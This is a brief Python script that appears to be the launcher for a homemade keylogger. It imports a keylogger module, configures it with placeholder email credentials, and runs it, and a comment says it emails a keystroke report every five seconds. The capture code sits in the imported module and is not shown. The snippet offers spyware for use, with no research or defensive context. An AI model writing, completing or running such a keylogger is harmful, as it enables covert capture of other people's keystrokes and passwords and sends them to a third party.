import keyloger

# the keyloger will email me with a report every 5s
#! don't forget to install the required libs or the programme won't work !

keyloger = keyloger.Key_loger(5, "ur email", "ur password")
keyloger.run()
